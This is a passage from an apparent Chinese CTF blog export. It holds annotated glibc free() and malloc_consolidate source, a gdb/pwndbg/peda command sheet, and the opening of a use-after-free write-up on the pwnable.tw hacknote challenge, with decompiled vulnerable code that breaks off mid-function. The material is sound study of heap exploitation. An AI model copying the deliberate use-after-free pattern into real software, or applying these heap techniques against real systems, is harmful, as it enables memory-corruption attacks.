class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">      &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 如果下一个chunk是top chunk，则直接与top chunk合并，不再放入unsorted bin里</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don't know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don't want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在完成之前的chunk合并后，如果当前chunk的size非常大，那就来一次（可能有的）内存整合，并返还多余的内存给操作系统</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">      &#123;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">          large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前chunk是通过mmap来的，则munmap</span></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 11 - malloc_consolidate 源码及其部分分析</title>
    <url>/2020/05/heap-11-malloc_consolidate/</url>
    <content><![CDATA[<p>fast chunk的内存整合</p>
<h2 id="1-介绍">1. 介绍</h2>
<ul>
<li>
<p>看了之前关于malloc和free的相关源码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    malloc_consolidate (av);</span><br></pre></td></tr></table></figure>
<p>就算不看malloc_consolidate的源码，也猜得出来其功能<br>
该函数是对 <strong>fast chunk</strong> 进行内存整合</p>
<blockquote>
<p>但为什么该函数取名为malloc_consolidate呢？真误导人呀 :-(</p>
</blockquote>
</li>
<li>
<p>但即便如此，该函数还起到了一个堆的初始化作用</p>
<blockquote>
<p>感到奇怪？ 看源码咯~</p>
</blockquote>
</li>
</ul>
<a id="more"></a>
<ul>
<li>过程
<ul>
<li>判断fast chunk的size最大值是否为0
<ul>
<li>如果是，则表明堆相关尚未初始化（当堆尚未初始化时，此值为0），调用malloc_init_state函数等等<br>
最后，<strong>函数返回</strong></li>
<li>否则
<ul>
<li>清空arena上关于fastbin的标志位</li>
<li>依次遍历各个index的每一条fast bin
<ul>
<li>依次遍历当前fast bin链上的各个fast chunk
<ul>
<li>如果上一个内存相邻的chunk是空闲的，则当前chunk与其合并</li>
<li>判断下一个内存相邻的chunk是否为top chunk
<ul>
<li>如果是，则当前chunk与其合并</li>
<li>如果不是
<ul>
<li>如果下一个内存相邻的chunk是空闲的，则当前chunk与其合并</li>
<li>将当前chunk放入unsorted bin中</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>上述过程全部结束后，<strong>函数返回</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="2-源码分析">2. 源码分析</h2>
<blockquote>
<p>所有的分析都以注释的形式添加进源代码中，方便阅读</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Also, because this routine needs to be called the first time through</span></span><br><span class="line"><span class="comment">  malloc anyway, it turns out to be the perfect place to trigger</span></span><br><span class="line"><span class="comment">  initialization code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn't</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 清空arena上关于fastbin的标志位</span></span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren't immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="comment">// 依次遍历fastbins的各个index的链头</span></span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">// 如果当前遍历到的index，其链上存在fast chunk</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">          check_inuse_chunk(av, p);</span><br><span class="line">          nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">          size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">          nextchunk = chunk_at_offset(p, size);</span><br><span class="line">          nextsize = chunksize(nextchunk);</span><br><span class="line">          <span class="comment">// 如果上一个内存相邻chunk为free chunk，则与当前chunk合并</span></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 如果下一个内存相邻chunk不为top chunk</span></span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">            <span class="comment">// 如果下一个内存相邻chunk为free chunk，则与当前chunk合并</span></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将（已经合并了相邻chunk的）当前chunk放入unsorted bin里</span></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">            unsorted_bin-&gt;fd = p;</span><br><span class="line">            first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 如果下一个内存相邻chunk是top chunk</span></span><br><span class="line">          <span class="comment">// 当前fast chunk与top chunk合并</span></span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">// 一直遍历，直到当前fastbin链上的所有chunk全部放入unsorted bin里</span></span><br><span class="line">        &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 一直遍历，直到所有fastbin链全部遍历完成</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 初始时 fastchunk的最大值为0，此时需要对heap进行初始化</span></span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb 常用命令</title>
    <url>/2020/04/gdb_command/</url>
    <content><![CDATA[<p>GDB 常用命令指南</p>
<a id="more"></a>
<h2 id="1-GDB">1. GDB</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动调试程序，其中带有传入的参数</span></span><br><span class="line">run &lt;arg1&gt; &lt;arg2&gt; ... <span class="comment"># 简写 r</span></span><br><span class="line"><span class="comment"># 先前如果已经执行过 run &lt;arg1&gt; &lt;arg2&gt; .. 指令后，重新执行时只需直接执行 run 即可。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重复上一条指令</span></span><br><span class="line">按下[Enter]键</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单步步过</span></span><br><span class="line">nexti <span class="comment"># 汇编层面，简写 ni</span></span><br><span class="line">next  <span class="comment"># 源代码层面，简写 n</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 单步步入</span></span><br><span class="line">stepi <span class="comment"># 汇编层面，简写 si</span></span><br><span class="line">step  <span class="comment"># 源代码层面，简写 s</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行到返回</span></span><br><span class="line">finish <span class="comment"># 简写 fini</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制函数直接返回（几乎不用）</span></span><br><span class="line"><span class="keyword">return</span> <span class="comment"># 简写 ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有设置的端点</span></span><br><span class="line">info <span class="keyword">break</span> <span class="comment"># 简写 info b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除端点</span></span><br><span class="line"><span class="keyword">del</span> &lt;<span class="keyword">break</span> num&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动/禁用断点</span></span><br><span class="line">enable breakpoints</span><br><span class="line">disable breakpoints</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看某个寄存器的值</span></span><br><span class="line"><span class="keyword">print</span> $rdi <span class="comment"># print 简写 p</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置某个寄存器的值</span></span><br><span class="line">set $rdx = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置内存上某个地址的值</span></span><br><span class="line">set &#123;int&#125;<span class="number">0x83040</span> = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看栈上的值</span></span><br><span class="line">  <span class="comment"># 传入的参数为显示的栈数据个数</span></span><br><span class="line">stack <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在某个地址上下断点（无参数时默认在$rip处下断）</span></span><br><span class="line">b *<span class="number">0x400123</span>     <span class="comment"># b 是 break 的简写</span></span><br><span class="line">b &lt;line_number&gt; <span class="comment"># 在当前源码文件中的第line_number行下断点</span></span><br><span class="line">b &lt;file_name&gt;:&lt;line_number&gt; <span class="comment"># 在&lt;file_name&gt;源码文件中的第line_number行下断点</span></span><br><span class="line"><span class="comment"># 临时断点（只生效一次</span></span><br><span class="line">tb *<span class="number">0x400123</span>    <span class="comment"># 全称 temp break</span></span><br><span class="line"><span class="comment"># 条件断点</span></span><br><span class="line">b *<span class="number">0x400123</span> <span class="keyword">if</span> a == <span class="number">100</span></span><br><span class="line"><span class="comment"># 忽略特定断点cnt次</span></span><br><span class="line">ignore 断点编号i cnt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出got表相关信息</span></span><br><span class="line">got</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出某个函数在libc上的地址</span></span><br><span class="line"><span class="keyword">print</span> system</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启/关闭ASLR</span></span><br><span class="line">aslr off</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前进程空间内存分布</span></span><br><span class="line">vmmap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示内存上的值</span></span><br><span class="line">  <span class="comment"># 格式：</span></span><br><span class="line">        <span class="comment"># d 按十进制格式显示变量。</span></span><br><span class="line">        <span class="comment"># u 按十六进制格式显示无符号整型。</span></span><br><span class="line">        <span class="comment"># o 按八进制格式显示变量。</span></span><br><span class="line">        <span class="comment"># t 按二进制格式显示变量。</span></span><br><span class="line">        <span class="comment"># a 按十六进制格式显示变量。</span></span><br><span class="line">        <span class="comment"># c 按字符格式显示变量。</span></span><br><span class="line">        <span class="comment"># f 按浮点数格式显示变量。</span></span><br><span class="line">  <span class="comment"># 大小：</span></span><br><span class="line">      <span class="comment"># b 一单元1字节</span></span><br><span class="line">        <span class="comment"># h 一单元2字节</span></span><br><span class="line">        <span class="comment"># w 一单元4字节</span></span><br><span class="line">        <span class="comment"># g 一单元8字节</span></span><br><span class="line">x/<span class="number">3</span>uh <span class="number">0x54320</span> <span class="comment"># 以地址0x54320为起始地址，返回3个单元的值，每个单元有两个字节，输出格式为无符号十六进制。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换线程</span></span><br><span class="line">thread &lt;id&gt; <span class="comment"># 切换至对应ID的线程</span></span><br><span class="line">info thread <span class="comment"># 查看当前进程中的所有线程信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出gdb</span></span><br><span class="line">quit <span class="comment"># 简写 q</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择父进程fork/exec后的跟踪对象</span></span><br><span class="line">set follow-fork-mode parent/child <span class="comment"># fork后跟踪父进程/子进程</span></span><br><span class="line">set follow-<span class="keyword">exec</span>-mode new/same     <span class="comment"># 使用开启新 inferior 来跟踪exec程序</span></span><br><span class="line">set detach-on-fork on/off     <span class="comment"># 是否同时调试fork后的两个程序</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试线程时的设置</span></span><br><span class="line">set non-stop on  <span class="comment"># 设置其他没触发断点的线程继续跑</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Ttext UI</span></span><br><span class="line">help tui <span class="comment"># 查看tui的相关命令</span></span><br><span class="line">tui reg general <span class="comment"># 启动TUI时附带寄存器窗口</span></span><br><span class="line">tui enable   <span class="comment"># 启动TUI</span></span><br><span class="line">tui disable <span class="comment"># 退出TUI</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动layout UI</span></span><br><span class="line">help layout <span class="comment"># 查看 layout 的相关命令</span></span><br><span class="line">layout src   <span class="comment"># 显示源代码窗口</span></span><br><span class="line">layout asm   <span class="comment"># 显示汇编窗口</span></span><br><span class="line">layout regs  <span class="comment">#显示源代码/汇编和寄存器窗口</span></span><br><span class="line">layout split <span class="comment"># 显示源代码和汇编窗口</span></span><br><span class="line">layout next  <span class="comment"># 显示下一个layout</span></span><br><span class="line">layout prev  <span class="comment"># 显示上一个layout</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在GDB中直接调用源码中的某个函数</span></span><br><span class="line"><span class="comment"># 这个语句通常对于大型项目中，执行特定类型的Print()函数很有用</span></span><br><span class="line">call &lt;expr&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 环境变量相关</span></span><br><span class="line">show environment [key] <span class="comment"># 显示环境变量</span></span><br><span class="line">set environment &lt;key&gt;=&lt;val&gt; ... <span class="comment"># 添加环境变量</span></span><br><span class="line">unset environment [key] <span class="comment"># 清空环境变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># signal 相关</span></span><br><span class="line">info signal / info handle <span class="comment"># 查看 signal 设置</span></span><br><span class="line">  <span class="comment"># operation如下：</span></span><br><span class="line">  <span class="comment">#   - no stop         </span></span><br><span class="line">  <span class="comment">#     当被调试的程序收到信号时，GDB不会停住程序的运行，但会打出消息告诉你收到这种信号。</span></span><br><span class="line">  <span class="comment">#   - stop</span></span><br><span class="line">  <span class="comment">#     当被调试的程序收到信号时，GDB会停住你的程序。</span></span><br><span class="line">  <span class="comment">#   - print</span></span><br><span class="line">  <span class="comment">#     当被调试的程序收到信号时，GDB会显示出一条信息。</span></span><br><span class="line">  <span class="comment">#   - noprint</span></span><br><span class="line">  <span class="comment">#     当被调试的程序收到信号时，GDB不会告诉你收到信号的信息。</span></span><br><span class="line">  <span class="comment">#   - pass / noignore</span></span><br><span class="line">  <span class="comment">#     当被调试的程序收到信号时，GDB不处理信号。这表示，GDB会把这个信号交给被调试程序会处理。</span></span><br><span class="line">  <span class="comment">#   - nopass / ignore</span></span><br><span class="line">  <span class="comment">#     当被调试的程序收到信号时，GDB不会让被调试程序来处理这个信号。</span></span><br><span class="line">handle &lt;SIG&gt; &lt;operation&gt;</span><br></pre></td></tr></table></figure>
<h2 id="2-Pwndbg-插件">2. Pwndbg 插件</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 针对PIE程序高效下断</span></span><br><span class="line">b * $rebase(offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前堆内chunks</span></span><br><span class="line">heap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示bins</span></span><br><span class="line">bins</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示main_arena</span></span><br><span class="line">p main_arena</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示canary</span></span><br><span class="line">canary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示堆的布局</span></span><br><span class="line">vis_heap_chunks</span><br></pre></td></tr></table></figure>
<h2 id="3-Peda-插件">3. Peda 插件</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 栈溢出时，计算当前栈帧的高度</span></span><br><span class="line">  <span class="comment"># 生成特殊字符串</span></span><br><span class="line">pattern create <span class="number">70</span></span><br><span class="line">  <span class="comment"># 计算相对偏移(传入的address为$rip出错地址)</span></span><br><span class="line">pattern offset address</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 8 - UAF漏洞的简单介绍及其例子</title>
    <url>/2020/04/heap-8-UAF/</url>
    <content><![CDATA[<p>A good Hacker should always take good notes!  —— hacknote</p>
<h2 id="1-UAF简介">1. UAF简介</h2>
<p>UAF —— Use After Free. 指的是当某个指针被free后，没有及时将这个指针置空，导致该指针成为悬浮指针，在程序中仍然可以对该指针指向的内存执行某些操作，例如写入数据，查看数据等（操作取决于程序）</p>
<h2 id="2-例子-—-pwnable-tw-hacknote">2. 例子 — pwnable.tw_hacknote</h2>
<p>点击 <a href="/2020/04/heap-8-UAF/hacknote.zip" title="这里">这里</a> 下载题目</p>
<h3 id="查看保护">查看保护</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> root @ Kiprey <span class="keyword">in</span> ~/Desktop/Pwn [14:16:43]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> checksec hacknote  </span></span><br><span class="line">[*] '/root/Desktop/Pwn/hacknote'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="执行流程">执行流程</h3>
<ol>
<li>提示用户选择选项，有 <strong>添加笔记</strong>、 <strong>删除笔记</strong>、 <strong>输出笔记</strong>和<strong>退出程序</strong>四个选项</li>
<li>根据用户的选择，执行不同的操作</li>
</ol>
<a id="more"></a>
<h3 id="漏洞函数">漏洞函数</h3>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addNote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ebx@8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-1Ch]@3</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [sp+10h] [bp-18h]@8</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+14h] [bp-14h]@8</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+1Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A04C &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;ptr + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;ptr + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;ptr + i) = sub_804862B;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = (<span class="keyword">int</span>)*(&amp;ptr + i);</span><br><span class="line">        *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)*(&amp;ptr + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="keyword">void</span> **)*(&amp;ptr + i) + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">        ++dword_804A04C;</span><br><span class="line">        <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deleteNote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+8h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)*(&amp;ptr + v1) + <span class="number">1</span>));</span><br><span class="line">    <span 